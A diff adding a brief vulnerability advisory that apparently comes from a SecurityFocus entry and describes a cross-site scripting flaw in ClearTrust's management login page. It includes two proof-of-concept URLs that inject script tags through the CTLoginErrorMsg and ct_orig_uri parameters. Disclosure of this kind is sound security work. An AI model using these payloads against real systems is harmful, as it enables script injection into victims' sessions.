@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/7108/info
+
+A cross-site scripting vulnerability has been discovered in ClearTrust. Specifically, the login page for the management application is not properly sanitized of some user-supplied values.
+
+An attacker can exploit this vulnerability by creating a specially crafted URL that includes malicious HTML code for the login page used by ClearTrust.
+
+https://victim.com/cleartrust/ct_logon.asp?CTLoginErrorMsg=<script>alert(1)
+</script>
+
+https://victim.com/cleartrust/ct_logon.asp?CTAuthMode=BASIC&CTLoginErrorMsg=
+xx&ct_orig_uri=">< script>alert(1)/script><"
